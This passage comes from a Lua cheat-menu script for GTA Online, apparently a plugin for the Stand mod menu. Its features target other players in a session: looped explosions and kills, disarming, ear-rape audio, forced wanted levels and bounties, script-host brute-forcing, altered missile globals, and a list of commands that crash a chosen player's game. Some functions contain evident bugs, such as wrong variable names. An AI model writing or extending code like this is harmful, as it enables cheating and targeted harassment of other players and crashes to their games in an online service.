                        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                        local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 5.0, 0.0)
                    
                        local hash = util.joaat("oppressor2")
                    
                        if not STREAMING.HAS_MODEL_LOADED(hash) then
                            load_model(hash)
                        end
                    
                        local oppressor = entities.create_vehicle(hash, c, ENTITY.GET_ENTITY_HEADING(ped))
                        ENTITY.SET_ENTITY_INVINCIBLE(oppressor)
                    
                        upgrade_vehicle(oppressor)
                    end
                    for k,v in pairs(players.list(true, true, true)) do
                        give_oppressor(v)
                        FearToast(FearScriptNotif.."\nAlright, you have spawned everyone the 'Oppressor MK2 Party'.")
                        util.yield()
                    end
                end)

                FearSessionL:action("Tankman Summon", {"feartankman"}, "Spawn everyone Tank", function ()
                    local function upgrade_vehicle(vehicle)
                        for i = 0, 49 do
                            local num = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, i)
                            VEHICLE.SET_VEHICLE_MOD(vehicle, i, num - 1, true)
                        end
                    end
                    local function give_tank(pid)
                        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                        local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 5.0, 0.0)
                    
                        local hash = util.joaat("rhino")
                    
                        if not STREAMING.HAS_MODEL_LOADED(hash) then
                            load_model(hash)
                        end
                    
                        local tank = entities.create_vehicle(hash, c, ENTITY.GET_ENTITY_HEADING(ped))
                        ENTITY.SET_ENTITY_INVINCIBLE(tank)
                    
                        upgrade_vehicle(oppressor)
                    end
                    for k,v in pairs(players.list(true, true, true)) do
                        give_tank(v)
                        FearToast(FearScriptNotif.."\nAlright, you have spawned everyone the 'Rhino Tank'.")
                        util.yield()
                    end
                end)

                FearSessionL:action("Dogfight Summon", {"feardogplane"}, "Spawn everyone Lazer", function ()
                    local function upgrade_vehicle(vehicle)
                        for i = 0, 49 do
                            local num = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, i)
                            VEHICLE.SET_VEHICLE_MOD(vehicle, i, num - 1, true)
                        end
                    end
                    local function give_plane(pid)
                        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                        local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 5.0, 0.0)
                    
                        local hash = util.joaat("lazer")
                    
                        if not STREAMING.HAS_MODEL_LOADED(hash) then
                            load_model(hash)
                        end
                    
                        local plane = entities.create_vehicle(hash, c, ENTITY.GET_ENTITY_HEADING(ped))
                        ENTITY.SET_ENTITY_INVINCIBLE(plane)
                    
                        upgrade_vehicle(lazer)
                    end
                    for k,v in pairs(players.list(true, true, true)) do
                        give_plane(v)
                        FearToast(FearScriptNotif.."\nAlright, you have spawned everyone the 'P-996 Lazer'.")
                        util.yield()
                    end
                end)

            ----=====================================================----
            ---                 Game Tweaks
            ---     All of the functions, improving the sessions
            ----=====================================================----

                FearSessionL:divider("Game Tweaks")
                FearSessionL:toggle_loop("Disarm all Weapons Permanently",{'feardisarmall'}, "Disarm weapon entirely in the session?\nNOTE: It may cause crash sometimes, be careful",function()
                    for _,pid in pairs(players.list(FearToggleSelf)) do
                        if FearSession() and players.get_name(pid) ~= "UndiscoveredPlayer" then
                            FearCommands("disarm"..players.get_name(pid))
                        end
                        util.yield(150)
                        update_player_count()
                    end
                    util.yield(5000)
                end)

                FearSessionL:toggle_loop("Loop Explode All Session",{'fearexplodeall'}, "Explode the entire session?\nNOTE: It may be detected by any modders and may karma you.",function()
                    for _,pid in pairs(players.list(FearToggleSelf)) do
                        if FearSession() and players.get_name(pid) ~= "UndiscoveredPlayer" then
                            FearCommands("explode"..players.get_name(pid))
                        end
                        util.yield(150)
                        update_player_count()
                    end
                    util.yield(5000)
                end)

                FearSessionL:toggle_loop("Ukraine Alarm Loop",{'fearukraineall'}, "Put Ukraine Alarm to the entire session?\nNOTE: It may be detected by any modders and may karma you.",function()
                    for _,pid in pairs(players.list(FearToggleSelf)) do
                        if FearSession() and players.get_name(pid) ~= "UndiscoveredPlayer" then
                            AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Air_Defences_Activated", PLAYER.GET_PLAYER_PED(pid), "DLC_sum20_Business_Battle_AC_Sounds", true, true)
                            players.send_sms(pid, players.user(), "WARNING: Ukraine has been invaded by Russia. Fuck Russia.")
                        end
                        FearTime(30)
                    end
                    FearTime(100)
                end)

                FearSessionL:toggle("Riot Mode", {"feartwd"}, "Put Riot Mode to everyone.",function(on)
                for _, pid in pairs(players.list(FearToggleSelf)) do
                    MISC.SET_RIOT_MODE_ENABLED(on)
                    end
                end)

                if menu.get_edition() >= 3 then
                    local FearToggleSelf_mugger = false
                    FearSessionL:toggle_loop("Mugger Loop", {'fearmglall'}, "Send Mugger Loop to the entire session?\nNOTE: It may be detected by any modders and may karma you.",function()
                        for _,pid in pairs(players.list(FearToggleSelf_mugger)) do
                            if FearSession() and players.get_name(pid) ~= "UndiscoveredPlayer" then
                                FearCommands("mugloop"..players.get_name(pid))
                            end
                            FearTime(30)
                        end
                        FearTime(100)
                    end)
                end

                FearSessionL:action("Earrape Session", {"fearearrapeall"}, "Put Earrape Alarm to the entire session?\nNOTE: It may be detected by any modders and may karma you.",function()
                    for i = 0, 100 do
                        for _, pid in pairs(players.list(FearToggleSelf)) do
                            local player_pos = players.get_position(pid)
                            AUDIO.PLAY_SOUND_FROM_COORD(-1, "BED", player_pos.x, player_pos.y, player_pos.z, "WASTEDSOUNDS", true, 9999, false)
                        end
                    end
                end)

            --------------------------------------------------------------------------------------

            local FearStandID = FearPath("Online>Protections>Detections>Stand User Identification")
            FearOnline:toggle("Toggle Stand User ID", {"fearstandid"}, "Toggle Stand Users ID Verification.\nNOTE: Toggle Stand User ID will not able to do something like Kick/Crash.", function(toggle)
            if toggle then
                FearCommand(FearStandID, "on")
                FearToast(FearScriptNotif.."\nStand User ID has been turned on.")
            else
                FearCommand(FearStandID, "off")
                FearToast(FearScriptNotif.."\nStand User ID has been turned off.")
                end
            end)

            FearOnline:toggle_loop("Bruteforce Script Host", {"fscripthost"}, "Brute Force Script Host to unlock some features such as unfreeze clouds, loading screen, etc...", function()
                FearCommands("givesh"..players.get_name(players.user()))
            end)

        ----=====================================================----
        ---               Standify Features
        ---     All of the functions, actions, list are available
        ----=====================================================----

        local sound_handle = nil
        FearStandify:divider("FearScript Standify "..FearStandify_ver)
        FearStandify:hyperlink("Open Music Folders", "file://"..script_store_dir, "Edit your music and enjoy.\nNOTE: You need to put .wav file.\nMP3 or another files contains invalid file are not accepted.") -- Open Music Folder contains your own Musics

            ----=====================================================----
            ---               Hyperlinks
            ---     Only for download converter or sometimes
            ----=====================================================----
            
            local FearStandifyConVerter = FearStandify:list("WAV Compress & Converter") -- Website Converter & Compress WAV. MP3 are not available
            FearStandifyConVerter:divider("Compressor")
            FearStandifyConVerter:hyperlink("WAV Compressor", "https://www.freeconvert.com/wav-compressor")
            FearStandifyConVerter:hyperlink("xconvert", "https://www.xconvert.com/compress-wav")
            FearStandifyConVerter:hyperlink("youcompress", "https://www.youcompress.com/wav/")
            FearStandifyConVerter:divider("Converter")
            FearStandifyConVerter:hyperlink("YouTube WAV Converter", "https://www.ukc.com.np/p/youtube-wav.html")
            FearStandifyConVerter:hyperlink("WAV Converter", "https://www.freeconvert.com/wav-converter")
            FearStandifyConVerter:hyperlink("cloudconvert", "https://cloudconvert.com/wav-converter")
            FearStandifyConVerter:hyperlink("online-convert", "https://audio.online-convert.com/convert-to-wav")
            FearStandifyConVerter:hyperlink("online-audio-coverter", "https://online-audio-converter.com/")

            FearStandify:divider("Main Menu") -- Main Menu Divider

            ----============================================================================----
            ---                         Saved Playlists
            --- All of your musics stored on %appdata%\Stand\Lua Scripts\FearScript Advanced\songs\
            ----============================================================================----

            local songs_direct = join_path(script_store_dir, "")
            local FearStandifyLoadedSongs = FearStandifyLoading(songs_direct)
            local FearStandifyFiles = {}
            for _, song in ipairs(FearStandifyLoadedSongs) do
                FearStandifyFiles[#FearStandifyFiles + 1] = song.file
            end
            
            local function FearStandifyPlay(sound_location)
                if current_sound_handle then
                    current_sound_handle = nil
                end
                current_sound_handle = FearPlaySound(sound_location, SND_FILENAME | SND_ASYNC)
            end
            
            FearStandify:list_action("Saved Playlists", {}, "WARNING: Heavy folder, so check if you have big storage, atleast average .wav file: 25-100 MB.", FearStandifyFiles, function(selected_index)
                local selected_file = FearStandifyFiles[selected_index]
                for _, song in ipairs(FearStandifyLoadedSongs) do
                    if song.file == selected_file then
                        local sound_location = song.sound
                        if not filesystem.exists(sound_location) then
                            FearToast(FearScriptStandify.. "\nSound file does not exist: " .. sound_location)
                        else
                            local display_text = string.gsub(selected_file, "%.wav$", "")
                            FearStandifyPlay(sound_location)
                            FearToast(FearScriptStandify.. "\nSelected Music: " .. display_text)
                        end
                        break
                    end
                end
            end)

            ----=====================================================----
            ---               Random Music Manual
            ---     Just click one time to choose your random music
            ----=====================================================----

            local played_songs = {} 
            local function FearStandifyAuto()
                random_enabled = not random_enabled
                if random_enabled and current_sound_handle == nil then
                    local song_files = filesystem.list_files(script_store_dir)
                    if #song_files > 0 then
                        local song_path
                        repeat 
                            song_path = song_files[math.random(#song_files)]
                        until not played_songs[song_path]
                        played_songs[song_path] = true 
                        AutoPlay(song_path)
                        local song_title = string.match(song_path, ".+\\([^%.]+)%.%w+$")
                        FearToast(FearScriptStandify.. "\nRandom music selected: " .. song_title)
                    else
                        FearToast(FearScriptStandify.. "\nThere is no music in the storage folder.")
                    end
                elseif not random_enabled and current_sound_handle then
                    current_sound_handle = nil
                end
            end

            FearStandify:action("Play Random Music", {'fstandifyrandom'}, "Play a random music.\nNOTE: You have each interval to click the action to select random music.", function(selected_index)
                FearStandifyAuto()
            end)

            ----================================================----
            ---               Stop Sounds
            ---     Automatically end the musics while playing.
            ----================================================----

            FearStandify:action("Stop Music", {'fstandifystop'}, "It will stop your music instantly.\nNOTE: Don't delete the folder called Stop Sounds, music won't stop and looped. Don't rename file.", function(selected_index) -- Force automatically stop your musics
                local sound_location_1 = join_path(script_store_dir_stop, "stop.wav")
                if not filesystem.exists(sound_location_1) then
                    FearToast(FearScriptStandify.."\nMusic file does not exist: " .. sound_location_1.. "\n\nNOTE: You need to get the file, otherwise you can't stop the sound.")
                else
                    sound_handle = FearPlaySound(sound_location_1, SND_FILENAME | SND_ASYNC)
                end
            end)

        FearStandify:divider("Miscs")
        FearStandify:readonly("FearScript (Standify)", FearStandify_ver)
        FearStandify:hyperlink("Standify: GitHub Source", "https://github.com/StealthyAD/Standify")

        ------==============------
        ---   Cruise Missile
        ------==============------

        local FearCruiseMissile_ver = "0.34.4"
        local FearCruiseMissileNTF = "> FearScript CruiseMissile "..FearCruiseMissile_ver
        FearCruiseMissile:divider("FearScript CruiseMissile "..FearCruiseMissile_ver)
        local FearPresetMissile = FearCruiseMissile:list("Cruise Missile Presets")
        FearPresetMissile:toggle_loop("Cruise Missile Range (9.32 Miles)", {"fearcruise15km"}, EXECUTION_FUNCTION_WORKING(false), function() -- 9.32 Miles Cruise Missile Range
            FearToast(FearCruiseMissileNTF.."\nStatus : Active (9.32 Miles)")
            FearCommands('damagemultiplier 7500')
            SET_INT_GLOBAL(262145 + 30188, 15000)
        end, function()
            FearToast(FearCruiseMissileNTF.."\nStatus : Inactive (9.32 Miles)")
            FearCommands('damagemultiplier 1')
            SET_INT_GLOBAL(262145 + 30188, 4000)
        end)

        FearPresetMissile:toggle_loop("Cruise Missile Range (18.6 Miles)", {"fearcruise30km"}, EXECUTION_FUNCTION_WORKING(false), function() -- 18.6 miles Cruise Missile Range
            FearToast(FearCruiseMissileNTF.."\nStatus : Active (18.6 Miles)")
            FearCommands('damagemultiplier 8500')
            SET_INT_GLOBAL(262145 + 30188, 30000)
        end, function()
            FearToast(FearCruiseMissileNTF.."\nStatus : Inactive (18.6 Miles)")
            FearCommands('damagemultiplier 1')
            SET_INT_GLOBAL(262145 + 30188, 4000)
        end)

        FearPresetMissile:toggle_loop("Cruise Missile Range (37.2 Miles)", {"fearcruise60km"}, EXECUTION_FUNCTION_WORKING(false), function() -- 37.2 Miles Cruise Missile Range
            FearToast(FearCruiseMissileNTF.."\nStatus : Active (37.2 Miles)")
            FearCommands('damagemultiplier 10000')
            SET_INT_GLOBAL(262145 + 30188, 60000)
        end, function()
            FearHelp(FearCruiseMissileNTF.."\nStatus : Inactive (37.2 Miles)")
            FearCommands('damagemultiplier 1')
            SET_INT_GLOBAL(262145 + 30188, 4000)
        end)

        FearPresetMissile:toggle_loop("Cruise Missile Range (Bypass)", {"fearcruisebypass"}, EXECUTION_FUNCTION_WORKING(false), function() -- Bypass Cruise Missile Range
            FearToast(FearCruiseMissileNTF.."\nStatus : Active")
            FearCommands('damagemultiplier 10000')
            SET_INT_GLOBAL(262145 + 30188, 99999)
        end, function()
            FearToast(FearCruiseMissileNTF.."\nStatus : Inactive")
            FearCommands('damagemultiplier 1')
            SET_INT_GLOBAL(262145 + 30188, 4000)
        end)
        
        FearCruiseMissileRange = FearCruiseMissile:slider("Cruise Missile Range", {"fcruisemissilerange"}, "Make sure you put the limit atleast 99 KM/H (which means 61.5 Miles)\nE.G: you want unlimited range, put the max.", 2, 99, 4, 1, function()end) -- Maximise your chance to hit enemy to high range

        FearCruiseMissile:toggle_loop("Toggle Cooldown Cruise Missile", {'fcruisemissilecooldown'}, EXECUTION_FUNCTION_WORKING(false), function()
            SET_INT_GLOBAL(262145 + 30187, 0)
        end,function()
            SET_INT_GLOBAL(262145 + 30187, 60000)
        end)
    
        FearCruiseMissile:action("Execute Cruise Missile", {"fcruisemissilefire"}, "NOTE: For indication detection, it tells you according to the range of the missile.\n\n- 2 to 4 Km - Short Missile\n- 4 to 6 Km - Standard Missile\n- 6 to 10 Km - Medium Missile\n- 10 to 19 Km - Long Range Missile\n- Superior than 20 Km - Extra Long Range Missile\n\nWARNING: Changing the session will put your Cruise Missile to Default State.", function()
            SET_INT_GLOBAL(262145 + 30188, menu.get_value(FearCruiseMissileRange) * 1000)
    
            if menu.get_value(FearCruiseMissileRange) >= 20 then -- Extra Long Range Range Missile
                FearToast(FearCruiseMissileNTF.."\nStatus : Extra Long Range Missile")
                FearCommands('damagemultiplier 10000')
            end
    
            if menu.get_value(FearCruiseMissileRange) >= 10 and menu.get_value(FearCruiseMissileRange) <= 19 then -- Long Range Missile
                FearToast(FearCruiseMissileNTF.."\nStatus : Long Range Missile")
                FearCommands('damagemultiplier 7500')
            end
    
            if menu.get_value(FearCruiseMissileRange) >=6 and menu.get_value(FearCruiseMissileRange) <= 9 then -- Medium Range Missile
                FearToast(FearCruiseMissileNTF.."\nStatus : Medium Range Missile")
                FearCommands('damagemultiplier 10000')
            end
    
            if menu.get_value(FearCruiseMissileRange) >= 4 and menu.get_value(FearCruiseMissileRange) <= 5 then -- Standard Missile
                FearToast(FearCruiseMissileNTF.."\nStatus : Standard Missile")
                FearCommands('damagemultiplier 1')
            end
            if menu.get_value(FearCruiseMissileRange) >= 2 and menu.get_value(FearCruiseMissileRange) <= 3 then -- Short Range Missile
                FearToast(FearCruiseMissileNTF.."\nStatus : Short Range Missile")
                FearCommands('damagemultiplier 1')
            end
        end)
    
        FearCruiseMissile:action("Revert to Default State", {'fcruisedefault'}, "Revert to Default State like Cruise Missile Range and Cooldown.", function() -- Revert Default Settings
            SET_INT_GLOBAL(262145 + 30188, 4000) -- Remove Bypass
            SET_INT_GLOBAL(262145 + 30187, 60000) -- Cooldown Time
            FearToast(FearCruiseMissileNTF.."\nReverted to Default State")
        end)

        FearCruiseMissile:divider("Miscs")
        FearCruiseMissile:readonly("FearScript (CruiseMissile)", FearCruiseMissile_ver)
        FearCruiseMissile:hyperlink("CruiseMissile: GitHub Source", "https://github.com/StealthyAD/Cruise-Missile")

        ------===============------
        ---   Miscs Functions
        ------===============------

            FearMiscs:divider("FearScript Miscs")
            FearMiscs:readonly("FearScript Version: "..FearVersion)
            FearMiscs:readonly("Stand Version: "..FearSEdition)
            FearMiscs:divider("FearScript Credits")
            FearMiscs:readonly("StealthyAD (Putin fanboy)")
	    FearMiscs:action("Check for Updates", {}, "The script will automatically check for updates at most daily, but you can manually check using this option anytime.", function()
        auto_update_config.check_interval = 0
            if auto_updater.run_auto_update(auto_update_config) then
                FearToast(FearScriptNotif.."\nNo updates found.")
            end
        end)

    ------===============------
    ---   Player Features
    ------===============------

    players.on_join(function(pid)
        update_player_count()
        local FearCrashFool = {
            crash = {
                "crash",
                "choke",
                "flashcrash",
                "ngcrash",
                "footlettuce",
            }
        }

        FearBoomCrash = function(pid, FearPlayerName)
            for _,cmd in pairs(FearCrashFool["crash"]) do
                if players.exists(pid) and players.get_name(pid) == FearPlayerName then
                    menu.trigger_commands(cmd..FearPlayerName)
                end
                util.yield(100)
            end
        end

        local FearPlayer = menu.player_root(pid)
        local FearPlayerName = players.get_name(pid)

        FearPlayer:divider(FearScriptV1)
        local FearFriendlyList = FearPlayer:list("Friendly Features")
        local FearNeutralList = FearPlayer:list("Neutral Features", {}, "")
        local FearGriefingList = FearPlayer:list("Griefing Features", {}, "")
        local FearAttackList = FearPlayer:list("Attack Features", {}, "")
        FearPlayer:toggle("Fast Spectate", {"fearsp"}, "Spectate "..FearPlayerName, function(toggle)
            if toggle then
                FearCommands("spectate"..FearPlayerName.." on")
                FearToast(FearScriptNotif.."\nYou are currently spectating "..FearPlayerName)
            else
                FearCommands("spectate"..FearPlayerName.." off")
                FearToast(FearScriptNotif.."\nYou are stopping spectating "..FearPlayerName)
            end
        end)

        ----=====================----
        --- Friendly     Features
        ----=====================----

            FearFriendlyList:divider("FearFriendly Advanced")
            FearFriendlyList:divider("Main Tweaks")
            FearFriendlyList:action("Unstuck Loading Screen", {"fearuls"}, "Unstuck "..FearPlayerName.." to the clouds or something else could be affect the session.", function()
                FearCommands("givesh"..FearPlayerName)
                FearCommands("aptme"..FearPlayerName)
            end, nil, nil, COMMANDPERM_FRIENDLY)

            FearFriendlyList:toggle("Infinite Ammo", {"fearbottomammo"}, "Give Infinite Ammo to "..FearPlayerName.." to help to fire constantly his guns.", function()
                if FearSession() then
                    if players.get_name(pid) then
                        FearCommands("ammo"..FearPlayerName)
                    else
                        FearCommands("bottomless off") -- If you are using yourself the feature.
                    end
                end
            end, nil, nil, COMMANDPERM_FRIENDLY)

            FearFriendlyList:toggle_loop("Never Wanted", {"fearnw"}, "Never Wanted Cops to "..FearPlayerName..".\nAlternative to Stand but easily lose cops." ,function()
                if FearSession() then
                    FearCommands("pwanted"..FearPlayerName.." 0")
                end
                util.yield(1000)
            end, nil, nil, COMMANDPERM_FRIENDLY)

            FearFriendlyList:divider("Vehicle Tweaks")
            FearFriendlyList:action("Spawn vehicle", {"fearspawnv"}, "Summon variable car for " ..FearPlayerName.."\nNOTE: You can spawn every each vehicle of your choice.", function (click_type)
            menu.show_command_box_click_based(click_type, "fearspawnv" .. FearPlayerName .. " ")end,
            function(txt)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 5.0, 0.0)
        
                local hash = util.joaat(txt)
        
                if not STREAMING.HAS_MODEL_LOADED(hash) then
                    load_model(hash)
                end
                local vehicle = entities.create_vehicle(hash, c, 0)
                request_control_of_entity(vehicle)
            end)

            FearFriendlyList:action("Oppresor Land", {"fearopr"}, "Spawn OppressorLand for "..FearPlayerName, function ()
            local function upgrade_vehicle(vehicle)
                for i = 0, 49 do
                    local num = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, i)
                    VEHICLE.SET_VEHICLE_MOD(vehicle, i, num - 1, true)
                end
            end
            local function give_ind_oppressor(pid)
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 5.0, 0.0)
            local hash = util.joaat("oppressor2")
            if not STREAMING.HAS_MODEL_LOADED(hash) then
                load_model(hash)
            end
            local oppressor = entities.create_vehicle(hash, c, ENTITY.GET_ENTITY_HEADING(ped))
            ENTITY.SET_ENTITY_INVINCIBLE(oppressor)
                upgrade_vehicle(oppressor)
            end
                give_ind_oppressor(pid)
                util.yield()
            end)

            FearFriendlyList:action("Adder Race", {"fearadder"}, "Spawn Adder for "..FearPlayerName, function ()
            local function upgrade_vehicle(vehicle)
                for i = 0, 49 do
                    local num = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, i)
                    VEHICLE.SET_VEHICLE_MOD(vehicle, i, num - 1, true)
                end
            end
            local function give_adder(pid)
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 5.0, 0.0)
            local hash = util.joaat("adder")
            if not STREAMING.HAS_MODEL_LOADED(hash) then
                load_model(hash)
            end
            local adder = entities.create_vehicle(hash, c, ENTITY.GET_ENTITY_HEADING(ped))
            ENTITY.SET_ENTITY_INVINCIBLE(adder)
                upgrade_vehicle(adder)
            end
                give_adder(pid)
                util.yield()
            end)

        ----=====================----
        --- Griefing     Features
        ----=====================----

            FearGriefingList:divider("FearGriefing Advanced")
            FearGriefingList:divider("Game Tweaks")
            local FearWanted = FearGriefingList:list("Wanted Features",{},"")
            local FearBounty = FearGriefingList:list("Bounty Features",{},"")

            FearGriefingList:divider("Player Tweaks")
            FearGriefingList:toggle_loop("Remove Entire Weapons",{'feardisarm'}, "Disarm "..FearPlayerName.."?\nNOTE: It will block Custom Weapon Loadout.",function()
                if FearSession() then
                    if players.get_name(pid) then
                        menu.trigger_commands("disarm"..players.get_name(pid))
                    end
                    util.yield(150)
                end
                util.yield(5000)
            end)

            FearGriefingList:toggle_loop("Kill "..FearPlayerName.." Loop", {'fearkillp'}, "Kill "..FearPlayerName.." in Loop?",function()
                if FearSession() then
                    if players.get_name(pid) then
                        FearCommands("kill"..FearPlayerName)
                    end
                    FearTime(150)
                end
                FearTime(500)
            end)

            FearGriefingList:toggle_loop("Eliminate Passive Mode Loop", {'fearkpm'}, "Are you sure to kill "..FearPlayerName.." during the Loop?", function()
                FearPassiveShot(pid)
            end)

            FearGriefingList:toggle_loop("Ukraine Alarm Loop",{'fearukraine'}, "You really want put Ukraine Alarm to "..FearPlayerName.." ?\nNOTE: It may be detected by player and may possibkle karma you if he's a modder.",function()
                if FearSession() then
                    if players.get_name(pid) then
                        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Air_Defences_Activated", PLAYER.GET_PLAYER_PED(pid), "DLC_sum20_Business_Battle_AC_Sounds", true, true)
                    end
                    FearTime(30)
                end
                FearTime(150)
            end)
            FearGriefingList:divider("Vehicle Tweaks")
            FearGriefingList:action("Summon Cargo Plane", {"fearcargoplane"}, "Spawn Big Cargo for "..FearPlayerName.."\nNOTE: Spawning Cargo Plane yourself will result to spawning only One Cargo Plane.\nSpawning Cargo Plane to "..FearPlayerName.." will create +50 entites Cargo Plane.", function ()
                local function upgrade_vehicle(vehicle)
                    for i = 0, 49 do
                        local num = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, i)
                        VEHICLE.SET_VEHICLE_MOD(vehicle, i, num - 1, true)
                    end
                end
                local function give_cargoplane(pid)
                    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                    local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 5.0, 0.0)
                
                    local hash = util.joaat("cargoplane")
                
                    if not STREAMING.HAS_MODEL_LOADED(hash) then
                        load_model(hash)
                    end
                
                    local cargoplane = entities.create_vehicle(hash, c, ENTITY.GET_ENTITY_HEADING(ped))
                    ENTITY.SET_ENTITY_INVINCIBLE(cargoplane)
                
                    upgrade_vehicle(cargoplane)
                end
                for k,v in pairs(players.list(true, true, true)) do
                    give_cargoplane(pid)
                    util.yield()
                end
            end, nil, nil, COMMANDPERM_RUDE)

            FearGriefingList:action("Summon Boeing", {"fearboeing"}, "Spawn Big Boeing 747 for "..FearPlayerName.."\nNOTE: Spawning Boeing 747 yourself will result to spawning only Boeing 747.\nSpawning Boeing to "..FearPlayerName.." will create +50 entites Boeing 747.", function ()
                local function upgrade_vehicle(vehicle)
                    for i = 0, 49 do
                        local num = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, i)
                        VEHICLE.SET_VEHICLE_MOD(vehicle, i, num - 1, true)
                    end
                end
                local function give_boeing(pid)
                    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                    local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 5.0, 0.0)
                
                    local hash = util.joaat("jet")
                
                    if not STREAMING.HAS_MODEL_LOADED(hash) then
                        load_model(hash)
                    end
                
                    local boeing = entities.create_vehicle(hash, c, ENTITY.GET_ENTITY_HEADING(ped))
                    ENTITY.SET_ENTITY_INVINCIBLE(cargoplane)
                
                    upgrade_vehicle(boeing)
                end
                for k,v in pairs(players.list(true, true, true)) do
                    give_boeing(pid)
                    util.yield()
                end
            end, nil, nil, COMMANDPERM_RUDE)

            ----=================----
            --- Wanted   Features
            ----=================----        

                local FearWanted_value = 1
                FearWanted:divider("FearWanted Advanced")
                FearWanted:slider("Wanted Level",{"fearwanted"}, "Chose the amount of the wanted level offered automatically.", 1, 5, 1 , 1, function(value)
                    FearWanted_value = value
                end)
                
                FearWanted:toggle("Auto Wanted Level", {"fearautow"}, "Put the guy cops and make sure cops come to his home." ,function()
                    if FearSession() then
                        if players.set_wanted_level(pid, FearWanted_value) ~= FearWanted_value then
                            FearCommands("pwanted"..FearPlayerName.." "..FearWanted_value)
                            FearToast(FearScriptNotif.."\nYou have automatically sent cops to "..FearPlayerName.." with "..FearWanted_value.." stars.")
                        elseif players.set_wanted_level(pid, FearWanted_value) == 0 then
                            FearToast(FearScriptNotif.."\nYou have automatically sent no cops to "..FearPlayerName)
                        end
                    end
                    util.yield(1000)
                end, nil, nil, COMMANDPERM_RUDE)

                FearWanted:action("Manual Wanted Level", {"fearmanualw"}, "Put the guy cops and make sure cops come to his home." ,function()
                    if FearSession() then
                        if players.set_wanted_level(pid, FearWanted_value) ~= FearWanted_value then
                            FearCommands("pwanted"..FearPlayerName.." "..FearWanted_value)
                            FearToast(FearScriptNotif.."\nYou have manually sent cops to "..FearPlayerName.." with "..FearWanted_value.." stars.")
                        end
                    end
                    util.yield(1000)
                end)

            ----=================----
            --- Bounty   Features
            ----=================----        

                local FearBounty_value = 0
                FearBounty:divider("FearBounty Advanced")
                FearBounty:slider("Bounty Value",{"fearbounty"}, "Chose the amount of the bounty offered automatically to "..FearPlayerName..".", 0, 10000, 0, 1, function(value)
                    FearBounty_value = value
                end)
                
                FearBounty:toggle("Auto Bounty", {"fearautobounty"}, "Put automatically bounty to "..FearPlayerName.."." ,function()
                    if FearSession() then
                        if players.get_bounty(pid) ~= FearBounty_value then
                            FearCommands("bounty"..FearPlayerName.." "..FearBounty_value)
                            FearToast(FearScriptNotif.."\nYou have automatically sent bounty to "..FearPlayerName.." with $"..FearBounty_value..".")
                        end
                    end
                    util.yield(1000)
                end, nil, nil, COMMANDPERM_RUDE)

                FearBounty:action("Manual Bounty", {"fearmanualb"}, "Put manually bounty to "..FearPlayerName.."." ,function()
                    if FearSession() then
                        if players.get_bounty(pid) ~= FearBounty_value then
                            FearCommands("bounty"..FearPlayerName.." "..FearBounty_value)
                            FearToast(FearScriptNotif.."\nYou have manually sent bounty to "..FearPlayerName.." with $"..FearBounty_value..".")
                        end
                    end
                    util.yield(1000)
                end, nil, nil, COMMANDPERM_RUDE)

        ----=====================----
        ---    Neutral Features 
        ----=====================----

            FearNeutralList:divider("FearNeutral Advanced")

            FearNeutralList:action("Detection Language", {"fdetectl"}, "Notifies you if someone speak another language.", function()
                if FearSession() then

                    if players.get_language(pid) == 0 then
                        FearToast(FearScriptNotif.."\n"..FearPlayerName.. " is English/or non-recognized language.") -- English/non-recognize Detection
                    end

                    if players.get_language(pid) == 1 then
                        FearToast(FearScriptNotif.."\n"..FearPlayerName.. " is French.") -- French Detection
                    end

                    if players.get_language(pid) == 2 then
                        FearToast(FearScriptNotif.."\n"..FearPlayerName.. " is German.") -- German Detection
                    end

                    if players.get_language(pid) == 3 then
                        FearToast(FearScriptNotif.."\n"..FearPlayerName.. " is Italian.") -- Italian Detection
                    end

                    if players.get_language(pid) == 4 then
                        FearToast(FearScriptNotif.."\n"..FearPlayerName.. " is Spanish.") -- Spanish Detection
                    end

                    if players.get_language(pid) == 6 then
                        FearToast(FearScriptNotif.."\n"..FearPlayerName.. " is Polish.") -- Polish Detection
                    end

                    if players.get_language(pid) == 7 then
                        FearToast(FearScriptNotif.."\n"..FearPlayerName.. " is Russian.") -- Russian Detection
                    end
                end
            end)

        ----====================================----
        --- Features Crash Player with Boom Nuke
        ----====================================----

            FearAttackList:divider("FearAttack Advanced")
            local FearLagPlayer = FearAttackList:list("Lag Players", {}, "")
            local FearCrashTool = FearAttackList:list("Crash Tool Players", {}, "")

        ----===========================----
        --- Lag Players with features
        ----===========================----

        FearLagPlayer:divider("FearLag Advanced ")

        FearLagPlayer:toggle_loop("Light Lag "..FearPlayerName, {"fearlag"}, "Freeze "..FearPlayerName.." To Make Work.", function()
            if players.exists(pid) then
                local freeze_toggle = menu.ref_by_rel_path(menu.player_root(pid), "Trolling>Freeze")
                local player_pos = players.get_position(pid)
                menu.set_value(freeze_toggle, true)
                request_ptfx_asset("core")
                GRAPHICS.USE_PARTICLE_FX_ASSET("core")
